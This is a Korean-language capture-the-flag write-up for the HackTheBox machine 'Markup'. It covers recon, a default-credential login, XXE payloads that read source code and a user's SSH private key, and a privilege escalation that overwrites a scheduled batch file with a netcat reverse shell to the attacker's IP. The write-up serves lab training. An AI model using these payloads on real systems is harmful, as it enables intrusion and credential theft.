# Markup - HackTheBox StartingPoint
- [Recon](#recon)
- [HTTP](#http)
- [Privesc](#privesc)
- [FLAG](#flag)
## Recon
```bash
sudo nmap -p 22,80,443 -sC -sV -oA Markup -vv 10.129.95.192
```
<img width="1104" height="439" alt="image" src="https://github.com/user-attachments/assets/464bf3b8-70f4-44d8-908b-cb91f3eb7553" />
<img width="1104" height="189" alt="image" src="https://github.com/user-attachments/assets/ab2747ef-6428-4a51-9951-65f8b4beccf2" />

- SSH(22)
- HTTP(80)
- HTTPS(443)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.129.95.192

curl -IL http://10.129.95.192
```
<img width="1104" height="334" alt="image" src="https://github.com/user-attachments/assets/5d41cfca-5d49-4215-a2ba-218efdbca29a" />

<br>
<br>

- `admin:password`로 로그인 시도해보니 로그인이 성공.
<img width="1100" height="668" alt="image" src="https://github.com/user-attachments/assets/98de6e70-a8ec-4b26-a1d8-e35f65b79b68" />

<br>
<br>

- html을 살펴보던 도중 `Order`탭의 html에서 `Daniel`이라는 유저가 발견됨.
<img width="1219" height="124" alt="image" src="https://github.com/user-attachments/assets/ec65a4df-1597-4a7d-b129-881c33d878b7" />

### XXE
- 해당 페이지의 내용을 채워 `burpsuite`로 가로채서 확인해보니 `xml`을 사용하고 있는 것을 확인.
<img width="752" height="242" alt="image" src="https://github.com/user-attachments/assets/66eafe61-463b-44e9-af5f-c9c506fc81ac" />

<br>
<br>

- 여러가지 공격 방법 중 PHP filter를 이용해서 소스코드를 읽을 수 있는 것을 확인.
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
<img width="1541" height="490" alt="image" src="https://github.com/user-attachments/assets/b1132173-30ae-4e1d-8c75-4ec5e6df369e" />

<br>
<br>

- `SSH`를 사용하고 있어서 위에서 발견된 유저인 `Daniel`의 `id_rsa`를 획득.
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=c:/users/daniel/.ssh/id_rsa">
```
<img width="1541" height="490" alt="image" src="https://github.com/user-attachments/assets/a970b199-939f-4f16-8d32-b4e510d76587" />

<br>
<br>

- `base64`로 디코딩하여 `Daniel`의 `id_rsa` 획득
```bash
echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuT.....'|base64 -d
```
<img width="716" height="593" alt="image" src="https://github.com/user-attachments/assets/d0c9f97f-a137-4110-9eff-6224ed37241e" />

<br>
<br>

- `id_rsa`로 `Daniel` 로그인.
<img width="1106" height="152" alt="image" src="https://github.com/user-attachments/assets/28d6e038-9d4e-46ff-8874-a2c9343cc22c" />

---
## Privesc
- `c:\Log-Management`에서 `job.bat`파일 발견.
<img width="1205" height="280" alt="image" src="https://github.com/user-attachments/assets/641938cb-fe9b-46fd-9e7f-75e7c16d00d2" />

<br>
<br>

- `job.bat`의 소유가 관리자로 되어 있음.
```powershell
dir /q job.bat
```
<img width="1205" height="231" alt="image" src="https://github.com/user-attachments/assets/62a101e6-861c-41c4-a189-1c6c4372b863" />

<br>
<br>

- 해당 파일을 수정할 수 있는지 시도.
- 명령어 실행 성공.
```powershell
echo ping -n 5 10.10.15.168 > job.bat
```
<img width="1205" height="126" alt="image" src="https://github.com/user-attachments/assets/53e0ce33-9774-4b8a-b23f-33dc910d2cfe" />
<img width="1205" height="341" alt="image" src="https://github.com/user-attachments/assets/dba9978a-72e7-4d96-b0c0-615fcf9a27b0" />

<br>
<br>

- 리버스 셸 실행 코드로 수정.
```powershell
echo c:\\programdata\\nc.exe 10.10.15.168 80 -e cmd.exe > job.bat
```
<img width="1205" height="106" alt="image" src="https://github.com/user-attachments/assets/b44bb192-447c-4718-bd2b-0cb105fd9633" />

<br>
<br>

- 셸 획득.
<img width="1205" height="245" alt="image" src="https://github.com/user-attachments/assets/d881bc81-b9d0-4297-b934-f153f9a53e8e" />

---
## FLAG
- `c:\users\daniel\desktop\user.txt`
<img width="1106" height="229" alt="image" src="https://github.com/user-attachments/assets/1a91884a-da5f-4940-8bed-d119999fb1de" />

- `c:\users\administrator\desktop\root.txt`
<img width="1205" height="299" alt="image" src="https://github.com/user-attachments/assets/2edec031-6079-4a97-bfb0-8913f200f5ae" />






